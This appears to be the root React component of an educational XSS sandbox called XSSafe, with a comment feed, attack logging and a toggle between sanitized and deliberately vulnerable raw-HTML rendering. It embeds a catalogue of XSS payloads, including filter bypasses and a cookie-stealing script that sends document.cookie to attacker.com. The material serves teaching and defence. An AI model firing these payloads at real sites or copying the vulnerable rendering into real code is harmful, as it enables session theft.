import React, { useState, useEffect } from 'react';
import { BlogPost } from './components/BlogPost';
import { CommentForm } from './components/CommentForm';
import { CommentCard } from './components/CommentCard';
import { AttackLog } from './components/AttackLog';
import { CspPanel } from './components/CspPanel';
import { SecurityAuditor } from './components/SecurityAuditor';
import { detectAttack } from './utils/detector';
import { sanitizeInput } from './utils/sanitizer';
import './App.css';

/**
 * App Component (Root component)
 * WHY: This component serves as the "Single Source of Truth" for the application.
 * By lifting state up to App, we can share state variables (like the list of comments
 * and the log of attacks) across sibling components like CommentForm, CommentCard,
 * and AttackLog. Changes flow down as props, and updates flow up via callbacks.
 */
function App() {
  const [activeTab, setActiveTab] = useState('sandbox');
  // Comments list state: Contains default demo messages loaded when page opens.
  // WHY: useState preserves variables across renders, updating this state triggers re-renders.
  const [comments, setComments] = useState([
    {
      id: "1",
      author: "🛡️ CyberSentinel (Admin)",
      rawBody: "Welcome to the <strong>XSSafe</strong> sandbox! This is a secure comment block. Feel free to try any HTML injections on the left panels.",
      sanitizedBody: "Welcome to the <strong>XSSafe</strong> sandbox! This is a secure comment block. Feel free to try any HTML injections on the left panels.",
      isAttack: false,
      attackType: "",
      timestamp: new Date(Date.now() - 3600000).toLocaleTimeString(),
      wasPostedSafely: true
    },
    {
      id: "2",
      author: "DeveloperBob",
      rawBody: "Let's test normal text. If you post using 'Post (Vulnerable)', your raw input is stored. If you post via 'Post (Safe)', it sanitizes before saving.",
      sanitizedBody: "Let's test normal text. If you post using 'Post (Vulnerable)', your raw input is stored. If you post via 'Post (Safe)', it sanitizes before saving.",
      isAttack: false,
      attackType: "",
      timestamp: new Date(Date.now() - 1800000).toLocaleTimeString(),
      wasPostedSafely: true
    }
  ]);

  // State for recorded attack logs.
  // WHY lazy initializer: The function inside useState(() => ...) runs ONCE on mount.
  // We attempt to read previously saved logs from localStorage (browser's on-disk storage).
  // JSON.parse converts the stored string back into a JavaScript array.
  // If nothing is saved yet (first visit) or the data is corrupted, we fall back to [].
  const [attackLogs, setAttackLogs] = useState(() => {
    try {
      const saved = localStorage.getItem('xssafe-attack-logs');
      return saved ? JSON.parse(saved) : [];
    } catch {
      return [];
    }
  });

  // WHY useEffect with [attackLogs] dependency: This runs every time attackLogs changes.
  // JSON.stringify serializes the array to a string (localStorage only stores strings).
  // This means every new attack detected is instantly written to disk — surviving refreshes.
  useEffect(() => {
    localStorage.setItem('xssafe-attack-logs', JSON.stringify(attackLogs));
  }, [attackLogs]);

  // State for the global output rendering mode (Safe vs Vulnerable).
  const [isSafeMode, setIsSafeMode] = useState(true);

  // State for the custom payload text typed by the user in the vault tester.
  const [customPayload, setCustomPayload] = useState("");

  // Saved custom payloads — persisted to localStorage so they survive refresh.
  // WHY lazy initializer: loads previously saved custom payloads on first render.
  const [savedCustomPayloads, setSavedCustomPayloads] = useState(() => {
    try {
      const saved = localStorage.getItem('xssafe-custom-payloads');
      return saved ? JSON.parse(saved) : [];
    } catch { return []; }
  });

  // WHY: auto-saves every time the user adds/removes a custom payload.
  useEffect(() => {
    localStorage.setItem('xssafe-custom-payloads', JSON.stringify(savedCustomPayloads));
  }, [savedCustomPayloads]);

  // Adds current textarea content to the saved vault list.
  const handleSaveToVault = () => {
    if (!customPayload.trim()) return;
    const result = detectAttack(customPayload);
    const newEntry = {
      id: Date.now().toString(),
      code: customPayload,
      severity: result.isAttack ? result.severity : "LOW",
      type: result.isAttack ? result.type : "Unknown / Clean",
      savedAt: new Date().toLocaleTimeString()
    };
    setSavedCustomPayloads(prev => [newEntry, ...prev]);
    setCustomPayload("");
  };

  // Removes a single saved custom payload by its id.
  const handleDeleteCustomPayload = (id) => {
    setSavedCustomPayloads(prev => prev.filter(p => p.id !== id));
  };

  // State to hold dynamic injections filled by clicking the vault items.
  const [injectedComment, setInjectedComment] = useState("");

  // XSS Payload Vault — 24 real-world vectors across 9 categories.
  // WHY: A diverse payload set ensures every layer of the sanitizer is stress-tested.
  // Fields: name, desc, code, category, severity (CRITICAL / HIGH / MEDIUM / LOW)
  const payloads = [
    // ── BASIC ──────────────────────────────────────────────────────────────
    { category: "Basic", severity: "CRITICAL", name: "Classic Script Alert",
      desc: "Most fundamental XSS test — executes JS via an injected script tag.",
      code: `<script>alert(1)</script>` },
    { category: "Basic", severity: "CRITICAL", name: "Cookie Disclosure",
      desc: "Reads session cookies via alert — first step in session hijacking.",
      code: `<script>alert(document.cookie)</script>` },
    { category: "Basic", severity: "CRITICAL", name: "Domain Disclosure",
      desc: "Exfiltrates site domain — confirms script execution during recon.",
      code: `<script>alert(document.domain)</script>` },
    // ── SCRIPT TAG BYPASSES ─────────────────────────────────────────────
    { category: "Script Bypass", severity: "CRITICAL", name: "Mixed Case Bypass",
      desc: "<ScRiPt> defeats naive case-sensitive string-matching filters.",
      code: `<ScRiPt>alert(1)</ScRiPt>` },
    { category: "Script Bypass", severity: "CRITICAL", name: "Trailing Space Bypass",
      desc: "A space inside the tag defeats filters matching exact string '<script>'.",
      code: `<script >alert(1)</script >` },
    { category: "Script Bypass", severity: "CRITICAL", name: "Data URI Script Src",
      desc: "Loads JS via data: URI in script src — bypasses external-URL-only filters.",
      code: `<script/src="data:,alert(1)"></script>` },
    // ── EVENT HANDLER BASED ─────────────────────────────────────────────
    { category: "Event Handler", severity: "HIGH", name: "Image onerror",
      desc: "Broken image src fires onerror. No <script> tag needed — classic bypass.",
      code: `<img src=x onerror=alert(1)>` },
    { category: "Event Handler", severity: "CRITICAL", name: "Image Cookie Stealer",
      desc: "Reveals cookies via onerror event — simulates real session hijacking.",
      code: `<img src=x onerror="alert(document.cookie)">` },
    { category: "Event Handler", severity: "HIGH", name: "Body Onload",
      desc: "Injected <body> tag fires onload automatically when the page renders.",
      code: `<body onload=alert(1)>` },
    { category: "Event Handler", severity: "HIGH", name: "Input Autofocus Onfocus",
      desc: "autofocus grants focus on load, triggering onfocus instantly — no click needed.",
      code: `<input autofocus onfocus=alert(1)>` },
    { category: "Event Handler", severity: "HIGH", name: "SVG Onload",
      desc: "SVG onload fires immediately on render — zero user interaction required.",
      code: `<svg onload=alert(1)>` },
    { category: "Event Handler", severity: "HIGH", name: "Video Onloadstart",
      desc: "onloadstart fires when the browser begins loading the video resource.",
      code: `<video onloadstart=alert(1) src=x>` },
    { category: "Event Handler", severity: "HIGH", name: "Details Ontoggle",
      desc: "HTML5 <details open> fires ontoggle automatically on page render.",
      code: `<details open ontoggle=alert(1)>` },
    { category: "Event Handler", severity: "MEDIUM", name: "Marquee Onstart",
      desc: "Legacy <marquee> fires onstart when its scroll animation begins.",
      code: `<marquee onstart=alert(1)>` },
    // ── HREF / LINK BASED ───────────────────────────────────────────────
    { category: "Href / Link", severity: "HIGH", name: "JavaScript Link (Click)",
      desc: "javascript: in href executes JS on click — classic phishing bait.",
      code: `<a href="javascript:alert(1)">click</a>` },
    { category: "Href / Link", severity: "CRITICAL", name: "Cookie Stealing Link",
      desc: "Steals cookies when user clicks — used in targeted phishing campaigns.",
      code: `<a href="javascript:alert(document.cookie)">click</a>` },
    // ── FILTER BYPASS ───────────────────────────────────────────────────
    { category: "Filter Bypass", severity: "MEDIUM", name: "HTML Entity Encoded",
      desc: "&#97;&#108;... = 'alert'. Browser decodes entities BEFORE execution — bypasses literal filters.",
      code: `<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>` },
    { category: "Filter Bypass", severity: "MEDIUM", name: "Double URL Encoding",
      desc: "%253C = %3C = '<' after two decode passes — defeats single-pass URL decoders.",
      code: "%253Cscript%253Ealert(1)%253C/script%253E" },
    { category: "Filter Bypass", severity: "MEDIUM", name: "Null Byte Injection",
      desc: "\\x00 splits the tag string — HTML parsers may reconstruct <script> after stripping it.",
      code: "<scr\\x00ipt>alert(1)</scr\\x00ipt>" },
    { category: "Filter Bypass", severity: "HIGH", name: "No-Space Slash Bypass",
      desc: "Slashes replace spaces (<img/src=x/onerror=...>) — breaks space-based tokenizers.",
      code: `<img/src=x/onerror=alert(1)>` },
    { category: "Filter Bypass", severity: "HIGH", name: "No-Quotes Backtick",
      desc: "Backticks as argument delimiters defeat quote-stripping sanitizers.",
      code: "<img src=x onerror=alert`1`>" },
    // ── SVG BASED ───────────────────────────────────────────────────────
    { category: "SVG", severity: "CRITICAL", name: "SVG Script Block",
      desc: "SVG XML namespace supports full <script> blocks — executes arbitrary JS.",
      code: `<svg><script>alert(1)</script></svg>` },
    { category: "SVG", severity: "HIGH", name: "SVG Slash Onload",
      desc: "<svg/onload=> is valid SVG syntax — bypasses some tokenizers.",
      code: `<svg/onload=alert(1)>` },
    { category: "SVG", severity: "HIGH", name: "SVG Animate onbegin",
      desc: "SVG animate onbegin fires when animation starts — no user action needed.",
      code: `<svg><animate onbegin=alert(1) attributeName=x></svg>` },
    // ── TEMPLATE INJECTION ──────────────────────────────────────────────
    { category: "Template Injection", severity: "HIGH", name: "AngularJS Constructor Chain",
      desc: "AngularJS evaluates {{ }}. Constructor chain calls eval() — full JS execution.",
      code: "{{constructor.constructor('alert(1)')()}}" },
    { category: "Template Injection", severity: "LOW", name: "Math Probe",
      desc: "{{7*7}} returning 49 confirms the template engine evaluates expressions.",
      code: "{{7*7}}" },
    { category: "Template Injection", severity: "HIGH", name: "Vue Template Expression",
      desc: "Vue evaluates ${{}} as JS if user content reaches the renderer unsanitized.",
      code: "${{alert(1)}}" },
    // ── POLYGLOT ────────────────────────────────────────────────────────
    { category: "Polyglot", severity: "CRITICAL", name: "Multi-Vector Polyglot",
      desc: "One payload crafted to execute in HTML, JS string, attribute, and URL contexts simultaneously.",
      code: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>" },
    // ── COOKIE STEALER ──────────────────────────────────────────────────
    { category: "Cookie Stealer", severity: "CRITICAL", name: "Image-Based Cookie Exfil",
      desc: "Creates an invisible image whose src sends document.cookie to attacker's server. This is how real session hijacking starts.",
      code: `<script>new Image().src="http://attacker.com/?c="+document.cookie</script>` },
  ];

  // Form submission callback
  // WHY: Coordinates comments creation, logs threats, and adds new items to comments array.
  const handlePostComment = (author, body, wasPostedSafely) => {
    // Run scanners
    const commentDetector = detectAttack(body);
    const authorDetector = detectAttack(author);
    
    const isCommentAttack = commentDetector.isAttack;
    const isAuthorAttack = authorDetector.isAttack;
    const isAttack = isCommentAttack || isAuthorAttack;
    
    // WHY attackType: Identifies the specific pattern matched for UI badge display.
    const attackType = isCommentAttack 
      ? commentDetector.type 
      : (isAuthorAttack ? authorDetector.type : "");
    
    // Log the threat if detected
    // WHY: If both the author name and comment body contain XSS scripts, we log them as
    // two separate event logs so security researchers can trace both vectors independently.
    const logsToAdd = [];
    if (isAuthorAttack) {
      logsToAdd.push({
        id: Date.now().toString() + "-auth-" + Math.random().toString(36).substr(2, 3),
        type: `👤 [Author Field] ${authorDetector.type}`,
        severity: authorDetector.severity,
        payload: author,
        timestamp: new Date().toLocaleTimeString()
      });
    }
    if (isCommentAttack) {
      logsToAdd.push({
        id: Date.now().toString() + "-comm-" + Math.random().toString(36).substr(2, 3),
        type: `💬 [Comment Field] ${commentDetector.type}`,
        severity: commentDetector.severity,
        payload: body,
        timestamp: new Date().toLocaleTimeString()
      });
    }
    if (logsToAdd.length > 0) {
      setAttackLogs(prevLogs => [...logsToAdd, ...prevLogs]);
    }

    // Setup comment parameters
    // If posted safely, we run the sanitizer BEFORE storing in comments database array.
    let finalAuthor = author;
    let finalRawBody = body;
    const finalSanitizedBody = sanitizeInput(body);

    if (wasPostedSafely) {
      finalAuthor = sanitizeInput(author);
      finalRawBody = finalSanitizedBody; // Overwrite raw so database stays clean.
    }

    const newComment = {
      id: Date.now().toString(),
      author: finalAuthor,
      rawBody: finalRawBody,
      sanitizedBody: finalSanitizedBody,
      isAttack: isAttack,
      attackType: attackType,
      // WHY attackSeverity: passed to CommentCard so the XSS badge shows threat level.
      attackSeverity: isCommentAttack ? commentDetector.severity : (isAuthorAttack ? authorDetector.severity : ""),
      timestamp: new Date().toLocaleTimeString(),
      wasPostedSafely: wasPostedSafely
    };

    // WHY: We use functional updater form setComments(prev => [...]) to ensure we do not
    // read stale state. It updates state based on the exact previous state array.
    setComments(prevComments => [newComment, ...prevComments]);
    
    // Reset payload trigger so it can be clicked again
    setInjectedComment("");
  };

  const handleClearLogs = () => {
    setAttackLogs([]);
    // WHY removeItem: Clearing state alone only clears RAM. We must also delete
    // the localStorage entry so the logs don't reload on the next page visit.
    localStorage.removeItem('xssafe-attack-logs');
  };

  return (
    <div>
      {/* Header */}
      <header className="app-header">
        <div className="header-brand">
          <div className="logo-glow">🛡️</div>
          <div>
            <h1>XSSafe</h1>
            <p className="subtitle">Interactive Anti-XSS Sanitizer Sandbox</p>
          </div>
        </div>

        {/* Navigation Tabs */}
        <nav className="header-nav">
          <button 
            className={`nav-link ${activeTab === 'sandbox' ? 'active' : ''}`}
            onClick={() => setActiveTab('sandbox')}
          >
            💻 Exploit Sandbox
          </button>
          <button 
            className={`nav-link ${activeTab === 'auditor' ? 'active' : ''}`}
            onClick={() => setActiveTab('auditor')}
          >
            🏥 Security Audit Center
          </button>
        </nav>
        
        {/* Global Sandbox Mode Toggle */}
        {activeTab === 'sandbox' && (
          <div className="toggle-section">
            <span className="toggle-label">Global Output Mode:</span>
            <div className="mode-toggle-container">
              <div className={`mode-indicator ${isSafeMode ? 'safe' : 'vulnerable'}`}></div>
              <button 
                className={`mode-btn ${isSafeMode ? 'active' : ''}`}
                onClick={() => setIsSafeMode(true)}
              >
                🛡️ Safe Mode
              </button>
              <button 
                className={`mode-btn ${!isSafeMode ? 'active' : ''}`}
                onClick={() => setIsSafeMode(false)}
              >
                ⚠️ Vulnerable
              </button>
            </div>
          </div>
        )}
      </header>

      {/* Main Dashboard Layout */}
      <main className={activeTab === 'sandbox' ? "app-container" : "app-container-full"}>
        {activeTab === 'sandbox' ? (
          <>
            {/* Left Column: Form Sandbox and Payload Vault */}
            <div className="workspace-column">
              
              {/* Mock Blog Post Article */}
              <BlogPost />

              {/* Form Input Component */}
              <CommentForm 
                onPostComment={handlePostComment} 
                injectedComment={injectedComment} 
              />

              {/* Hardcoded payloads vault */}
              <div className="payload-vault-container">
                <h3>📂 XSS Payload Vault</h3>

                {/* ── CUSTOM PAYLOAD TESTER ─────────────────────────────────────────
                    WHY: Lets users test ANY XSS script beyond the 24 preloaded ones.
                    The live detection result updates as the user types, showing the
                    attack type and severity BEFORE they load it into the form.
                */}
                <div className="custom-payload-tester">
                  <div className="custom-tester-header">
                    <span className="custom-tester-title">🧪 Custom Payload Tester</span>
                    <span className="custom-tester-sub">Write or paste your own XSS script</span>
                  </div>

                  <textarea
                    id="custom-payload-input"
                    className="custom-payload-textarea"
                    rows="3"
                    placeholder={`Try anything, e.g.\n<details open ontoggle=alert('custom XSS')>`}
                    value={customPayload}
                    onChange={(e) => setCustomPayload(e.target.value)}
                    spellCheck={false}
                  />

                  {/* Live detection result — updates as user types */}
                  {customPayload.trim() && (() => {
                    const result = detectAttack(customPayload);
                    return (
                      <div className={`custom-detect-result ${result.isAttack ? 'detected' : 'clean'}`}>
                        {result.isAttack ? (
                          <>
                            <span className="detect-icon">🚨</span>
                            <span className="detect-text">{result.type}</span>
                            <span className={`severity-badge sev-${result.severity.toLowerCase()}`}>
                              {result.severity}
                            </span>
                          </>
                        ) : (
                          <>
                            <span className="detect-icon">✅</span>
                            <span className="detect-text">No known pattern detected — DOMPurify still sanitizes on post</span>
                          </>
                        )}
                      </div>
                    );
                  })()}

                  <div className="custom-tester-actions">
                    <button
                      className="btn-load-custom"
                      disabled={!customPayload.trim()}
                      onClick={() => {
                        setInjectedComment(customPayload);
                        setCustomPayload("");
                      }}
                    >
                      ⚡ Load into Form
                    </button>
                    {/* WHY Save to Vault: persists the payload so it appears in the
                        vault list below and survives page refresh via localStorage. */}
                    <button
                      className="btn-save-custom"
                      disabled={!customPayload.trim()}
                      onClick={handleSaveToVault}
                    >
                      💾 Save to Vault
                    </button>
                    <button
                      className="btn-clear-custom"
                      disabled={!customPayload.trim()}
                      onClick={() => setCustomPayload("")}
                    >
                      ✕
                    </button>
                  </div>
                </div>

                <p className="vault-sub">Or pick from 24 real-world payloads below:</p>

                {/* ── SAVED CUSTOM PAYLOADS ─────────────────────────────────────
                    WHY: Renders user-saved payloads first so they are easy to find.
                    Each entry has a Load button and a 🗑 delete button.
                */}
                {savedCustomPayloads.length > 0 && (
                  <div className="payload-category-group">
                    <div className="payload-category-label custom-category-label">
                      ⭐ My Custom Payloads ({savedCustomPayloads.length})
                    </div>
                    {savedCustomPayloads.map((p) => (
                      <div key={p.id} className="payload-card custom-saved-card">
                        <div className="payload-card-header">
                          <span className="custom-saved-meta">
                            Saved at {p.savedAt}
                          </span>
                          <div className="payload-card-actions">
                            <span className={`severity-badge sev-${p.severity.toLowerCase()}`}>
                              {p.severity}
                            </span>
                            <button
                              className="btn-inject"
                              onClick={() => setInjectedComment(p.code)}
                            >
                              ⚡ Load
                            </button>
                            <button
                              className="btn-delete-custom"
                              onClick={() => handleDeleteCustomPayload(p.id)}
                              title="Remove from vault"
                            >
                              🗑
                            </button>
                          </div>
                        </div>
                        <p className="payload-desc custom-type-label">{p.type}</p>
                        <pre className="payload-code-preview">
                          <code>{p.code}</code>
                        </pre>
                      </div>
                    ))}
                  </div>
                )}
                {/* WHY grouped render: payloads.reduce groups the flat array into a
                    category → items map, then Object.entries iterates each group.
                    This avoids a separate state variable for grouping. */}
                {Object.entries(
                  payloads.reduce((acc, p) => {
                    if (!acc[p.category]) acc[p.category] = [];
                    acc[p.category].push(p);
                    return acc;
                  }, {})
                ).map(([category, items]) => (
                  <div key={category} className="payload-category-group">
                    <div className="payload-category-label">{category}</div>
                    {items.map((p, idx) => (
                      <div key={idx} className="payload-card">
                        <div className="payload-card-header">
                          <strong>{p.name}</strong>
                          <div className="payload-card-actions">
                            <span className={`severity-badge sev-${p.severity.toLowerCase()}`}>
                              {p.severity}
                            </span>
                            <button
                              className="btn-inject"
                              onClick={() => setInjectedComment(p.code)}
                            >
                              ⚡ Load
                            </button>
                          </div>
                        </div>
                        <p className="payload-desc">{p.desc}</p>
                        <pre className="payload-code-preview">
                          <code>{p.code}</code>
                        </pre>
                      </div>
                    ))}
                  </div>
                ))}
              </div>
            </div>

            {/* Right Column: Security Logs & Comment Feed */}
            <div className="workspace-column">
              
              {/* Security Event Log Panel */}
              <AttackLog 
                logs={attackLogs} 
                onClearLogs={handleClearLogs} 
              />

              {/* Comments Feed section */}
              <div className="comment-feed-section">
                <div className="feed-header">
                  <h3>💬 Sandbox Comment Feed</h3>
                  <span className="comments-count">{comments.length} comments</span>
                </div>

                {/* Banner displaying the active status of rendering */}
                <div className={`banner-indicator ${isSafeMode ? 'banner-safe' : 'banner-vuln'}`}>
                  <strong>
                    {isSafeMode 
                      ? "🛡️ SAFE RENDERING ACTIVE: DOMPurify is scrubbing HTML output. Dynamic script execution is blocked." 
                      : "⚠️ VULNERABLE RENDERING ACTIVE: Raw innerHTML is loaded. Malicious JS scripts will execute in your browser!"}
                  </strong>
                </div>

                {/* Rendering list of CommentCards */}
                <div className="comment-list">
                  {comments.map((comment) => (
                    <CommentCard 
                      key={comment.id} 
                      comment={comment} 
                      isSafeMode={isSafeMode} 
                    />
                  ))}
                </div>
              </div>

            </div>

            {/* ── CONTENT SECURITY POLICY EDUCATIONAL BLOCK ────────────────────────
                WHY: Appears full-width below the two sandbox columns to conclude the
                defense-in-depth explanation.
            */}
            <CspPanel />
          </>
        ) : (
          <SecurityAuditor />
        )}
      </main>
    </div>
  );
}

export default App;
